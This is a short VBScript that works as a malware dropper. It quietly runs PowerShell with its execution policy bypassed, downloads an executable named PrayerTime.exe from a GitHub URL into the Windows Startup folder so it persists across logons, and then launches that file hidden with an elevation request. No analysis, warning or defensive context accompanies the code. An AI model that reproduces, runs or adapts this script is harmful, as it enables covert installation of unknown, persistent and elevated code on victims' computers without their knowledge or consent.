Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""$url = 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/PrayerTime.exe'; $dest = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup\PrayerTime.exe'); Invoke-WebRequest -Uri $url -OutFile $dest; Start-Process $dest -WindowStyle Hidden -Verb RunAs""", 0, False